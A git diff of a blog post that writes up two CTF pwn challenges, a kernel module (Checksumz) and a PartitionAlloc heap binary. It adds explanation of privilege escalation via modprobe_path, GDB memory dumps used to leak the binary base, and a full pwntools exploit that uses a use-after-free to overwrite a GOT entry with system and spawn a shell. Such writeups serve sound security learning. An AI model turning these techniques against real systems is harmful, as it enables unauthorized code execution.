@@ -1,6 +1,6 @@
 +++
 title = "Upsolving two pwn challenges from last year"
-date = "2025-01-06T18:06:12+08:00"
+date = "2026-02-02T00:57:12+08:00"
 author = "azazo"
 description = "my new years resolution is get better at pwn"
 tags = ["ctf", "writeup"]
@@ -12,7 +12,7 @@ draft = true
 
 # Introduction
 
-Happy (belated) new year. Here are writeups for two pwn challenges I didn't manage to solve last year. I'll be writing these writeups as if I was explaining the solutions to one year ago me, so some parts might be over/underexplained. 
+Happy (very belated) new year. Here are writeups for two pwn challenges I didn't manage to solve last year. I'll be writing these writeups as if I was explaining the solutions to one year ago me, so some seemingly obvious parts might be overexplained.
 
 # IrisCTF 2025 - Checksumz
 
@@ -361,9 +361,15 @@ The `checksumz_release` function, as the counterpart to `close()`, simply frees 
 
 The write and read functions are implemented incorrectly. Since only the starting position is checked for whether it's out of bounds, we can write 15 bytes and read 255 bytes past the end of `state`.
 
-This is a very limited primitive, but conveniently, right after `state` in the struct is `size`. As a reminder, `size` is the bound that our read/write index is check against. If we set `size` to a really large number, we can read/write from anywhere in memory after the `state` buffer!
+This is a very limited primitive, but conveniently, right after `state` in the struct is `size`. As a reminder, `size` is the bound that our read/write index is check against. If we set `size` to a really large number, we can read/write from anywhere in memory after the `state` buffer! We can further upgrade our write by noticing that we can overwrite the value of the `buffer->name` pointer, which we can write to with `ioctl`, so we effectively have an arbitrary write.
 
 ## What now?
+
+As mentioned before, in kernel challenges our goal is usually to achieve privilege escalation to root in some way. As Elma writes, two common ways of getting root are
+- calling `commit_creds(prepare_kernel_cred(&init_task))`
+- overwriting `modprobe_path`
+
+While the former technique seems to be more versatile, the latter is simpler and can be done with one single arbitrary write. 
 
 ## Taking care of KASLR
 
@@ -566,23 +572,159 @@ unsigned __int64 __fastcall deleteHomework()
 }
 ```
 
-Notice how in the second for loop, the program "shifts" all homeworks after the deleted one to the left to get rid of the hole. However, `HOMEWORK[15]` is not set to 0. This means that if we fill up the homework array then delete any homework, `HOMEWORK[14]` and `HOMEWORK[15]` will point to the same homework. If we then delete the homework at index 15, we have a use after free!
+Notice how in the second for loop, the program "shifts" all homeworks after the deleted one to the left to get rid of the hole. However, `HOMEWORK[15]` is not set to 0. This means that if we fill up the homework array then delete any homework, `HOMEWORK[14]` and `HOMEWORK[15]` will point to the same homework. If we then delete the homework at index 15, we can access the freed chunk through `HOMEWORK[14]`, which is a use after free!
 
 However, as you might have noticed from the function name, the `MALLOC()` here isn't the standard libc `malloc()`, and instead uses [`PartitionAlloc` from Chromium](https://chromium.googlesource.com/chromium/blink/+/master/Source/wtf/PartitionAlloc.h). So, the structure of an allocated/freed chunk are different from usual, and we can't just copy payloads over.
 
-Fortunately, we don't need to learn much about how the allocator works to solve this challenge. 
+Fortunately, we don't need to learn much about how the allocator works to solve this challenge. Similar to the kernel SLUB allocator, `PartitionAlloc` deals with chunks of fixed size, and chunks of different sizes are allocated to different regions in memory. To see this, we can create two homework and two events with descriptions `meow` and `testing123`, and see where they are allocated to:
+```
+Enter your choice: 5
+0x38b09c04010
+[0] meow
+0x38b09c04040
+[1] testing123
+
+Enter your choice: 10
+0x38b09c04070
+[0] 2026-01-01: meow
+
+0x38b09c1c010
+[1] 2026-01-01: testing123
+```
+
+While both homework and the first event are allocated with addresses starting with `38b09c04`, the last piece of homework has `38b09c1c`. If you recall, homeworks consist of a `size_t size` and `char* buf` and so are 16 bytes long. Meanwhile, events are of variable size, with a `time_t` (8 bytes) and the description stored directly in the same chunk. Therefore, events with descriptions that have length 8 - 2 (newline and null byte) = 6 bytes or shorter, will be allocated in the same memory region as homeworks.
+
+Why does this matter? If we perform the trick mentioned before to get a pointer to a freed chunk in `HOMEWORK[14]`, then create and event with a short description, the allocator will reuse the freed chunk from the homework for the event, and we can access the same chunk in two different formats. The `size` of the homework and the time of the event, and the `buf` of the homework and the description of the event will completely overlap with each other.
+
+Since, we are capable of editing both homeworks and events, we can first change the description of the event to a memory address, then edit the description of the homework, which would write to that memory address, since `buf` is taken to be a pointer. Of course, we can also read from the memory address, but since we are also overwriting `size` with a `time_t` we will be reading a lot more bytes than needed. In fact, the time is stored internally as number of seconds since UNIX epoch, so the smallest nonzero value is 86400, achieved by having a date of `1970-01-02`.
+
 
 ## What now?
 
 Ok, so now we can read and write to arbitrary addresses. What do we do now? This might sound like a stupid question, but it was something that (unfortunately) I was mentally stuck on for quite some while. Beyond simple ret2win/ret2libc challenges, there is often no clear way to get a shell, which intimidated me quite a lot for some reason.
 
-Anyways, there exists [this helpful resource](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md) that goes through several ways of executing arbitrary code given a write primitive. 
+Anyways, there exists [this helpful resource](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md) that goes through six ways of executing arbitrary code given a write primitive. They are,
+1. Overwrite GOT entries
+2. Forge the `link_map` struct in ld.so
+3. FSOP with `stdout`
+4. Overwriting `printf` conversion specifiers
+5. Overwriting `dtor_list` in TLS storage
+6. Leaking `environ` and doing ROP
 
-
+Of these methods, the first is the simplest, so that is what we are going to do. Since RELRO is disabled in our binaries, we can overwrite any GOT entry we like, with a `one_gadget` or something similar. However, since `__isoc99_sscanf` is called with our input as the first argument almost right after we enter it, I chose to overwrite it with `system`, then enter `/bin/sh` when queried for an input.
 
 ## Leaking addresses
 
+While RELRO is disabled, PIE is enabled, so our binary is loaded at an unknown base address that we need to leak somehow. Unfortunately, this seems to be quite difficult, as there really isn't anything in the program that can leak an address for us (as far as I know, which probably isn't very far). After some time scouring through the decompilation and trying to find anything that can spit out an address of a symbol, I quickly gave up and decided to actually think.
 
+Since this challenge allocates chunks in a `mmap()`ed page, it would not be unreasonable to expect there to be pointers living in there that point to symbols in the binary. We can try to see this in GDB:
+```
+gef➤  info proc mappings
+process 729000
+Mapped address spaces:
 
+Start Addr         End Addr           Size               Offset             Perms File 
+0x00000dbdc4600000 0x00000dbdc4601000 0x1000             0x0                ---p   
+0x00000dbdc4601000 0x00000dbdc4602000 0x1000             0x0                rw-p   
+0x00000dbdc4602000 0x00000dbdc4604000 0x2000             0x0                ---p   
+0x00000dbdc4604000 0x00000dbdc47fc000 0x1f8000           0x0                rw-p   
+0x00000dbdc47fc000 0x00000dbdc4800000 0x4000             0x0                ---p   
+0x0000555555554000 0x0000555555556000 0x2000             0x0                r--p  /home/azazo/ctf/pwn/studystudystudy/studystudystudy 
+0x0000555555556000 0x0000555555561000 0xb000             0x2000             r-xp  /home/azazo/ctf/pwn/studystudystudy/studystudystudy 
+0x0000555555561000 0x0000555555566000 0x5000             0xd000             r--p  /home/azazo/ctf/pwn/studystudystudy/studystudystudy 
+0x0000555555566000 0x0000555555567000 0x1000             0x12000            rw-p  /home/azazo/ctf/pwn/studystudystudy/studystudystudy 
+...
+```
+
+Let's just start looking at the very first read and write page.
+
+```
+gef➤  x/20g 0x00000dbdc4601000
+0xdbdc4601000:	0x555555566500	0xdbdc4600000
+0xdbdc4601010:	0xdbdc4800000	0x0
+0xdbdc4601020:	0xdbdc4604030	0x0
+0xdbdc4601030:	0x555555567cc8	0xffff000003aa0001
+0xdbdc4601040:	0x0	0x0
+0xdbdc4601050:	0x0	0x100000000
+0xdbdc4601060:	0x0	0x0
+0xdbdc4601070:	0x0	0x200000000
+0xdbdc4601080:	0xdbdc4610060	0x0
+0xdbdc4601090:	0x555555567dc8	0xffff000001d50001
+```
+...and apparently, we lucky enough to have the first thing in memory be an address to something in the binary. If we try to see what the address contains, GDB also helpfully tells us that it has a name:
+```
+gef➤  x/g 0x555555566500
+0x555555566500 <partition>:	0x18000
+```
+And luckily, the start of the first read and write page is always a fixed offset from the address of the first homework we allocate. With this, we can obtain the binary's base address, and figure out the address to write and write to.
+
+Here is my full solve script:
+```py
+from pwn import *
+
+e = ELF("studystudystudy")
+p = process("studystudystudy")
+
+# GET UAF
+for _ in range(16):
+    p.sendlineafter(b"Enter your choice:", b"1")
+    p.sendline(b"a"*8)
+# free 14 so 14 and 15 point to same thing, then free 15
+p.sendlineafter(b"Enter your choice:", b"4")
+p.sendline(b"14")
+p.sendlineafter(b"Enter your choice:", b"4")
+p.sendline(b"15")
+# 14 now points to an already freed chunk
+
+# now we allocate an event with an empty description to make it occupy the same position as hw 14
+p.sendlineafter(b"Enter your choice:", b"6")
+p.sendline(b"2026-01-01")
+p.sendline(b"")
+
+# at the very start of the allocated region theres a pointer to a thing in the binary
+# if we get that we can get the base address . smile
+
+p.sendlineafter(b"Enter your choice:", b"5")
+first_chunk = int(p.recvline().strip(), 16)
+log.info(f"first chunk at 0x{first_chunk:x}")
+addr_partition = first_chunk - 0x3010
+
+# we want to read the thing at addr_partition
+p.sendlineafter(b"Enter your choice:", b"8")
+p.sendline(b"0")
+p.sendline(b"1970-01-02")
+p.sendline(p64(addr_partition))
+
+p.sendlineafter(b"Enter your choice:", b"2")
+p.sendlineafter(b"Enter homework index: ", b"14")
+partition = u64(p.recv(8))
+log.info(f"partition at 0x{partition:x}")
+
+e.address =  partition - e.sym["partition"]
+
+# we are going to overwrite __isoc99_sscanf with system
+
+log.info(hex(e.got["__isoc99_sscanf"]))
+log.info(hex(e.sym["system"]))
+
+p.sendlineafter(b"Enter your choice:", b"8")
+p.sendline(b"0")
+p.sendline(b"1970-01-02")
+p.sendline(p64(e.got["__isoc99_sscanf"]))
+p.sendlineafter(b"Enter your choice:", b"3")
+p.sendlineafter(b"Enter homework index: ", b"14")
+p.sendline(p64(e.sym["system"]))
+
+p.sendline(b"/bin/sh")
+p.interactive()
+```
+
+For some reason, this doesn't always work and hangs at some of the `p.sendlineafter()` calls, but frankly this writeup has taken me too long to write so I'm not going to figure out why.
+
+# Conclusion
+
+Fun fact: I started writing this on 6th January, but gave up pretty early into the writing because I didn't feel comfortable doing a writeup for challenges this easy. Of course, to me at the time these challenges seemed difficult, but now with more experience (and friends that do pwn) I can quite confidently say that these are on the easier side; in fact it even felt a bit shameful and performative to write writeups for them. But unfortunately compulsory military conscription is a thing in my country, so I wanted to finish this before being gone for a while, and I think sometimes it's good to just write things without thinking too much about how they will be perceived.
+
+Regardless, I hope you enjoyed reading this and/or learned something. See you (hopefully) soon.
 
 [^1]: i gotta put that jlpt n2 certification to use somehow
